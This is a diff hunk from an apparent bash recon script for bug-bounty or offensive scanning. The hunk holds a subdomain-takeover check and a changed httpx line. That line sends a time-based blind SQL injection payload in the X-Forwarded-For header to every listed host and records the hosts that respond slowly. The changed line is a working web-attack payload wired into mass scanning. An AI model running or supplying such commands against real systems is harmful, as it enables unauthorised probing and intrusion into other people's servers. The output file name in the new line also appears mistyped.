@@ -79,7 +79,7 @@ subzy run --targets uniq.txt --timeout 30 --output subtake
 echo "-------------------------------------------------------------------------"
 echo "-------------------------------------------------------------------------"
 echo "Checking for Header-Based-SQL-Injection:"
-cat un.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
+cat uniq.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13' | anew headersqli.tx
 echo "-------------------------------------------------------------------------"
 echo "-------------------------------------------------------------------------"
 
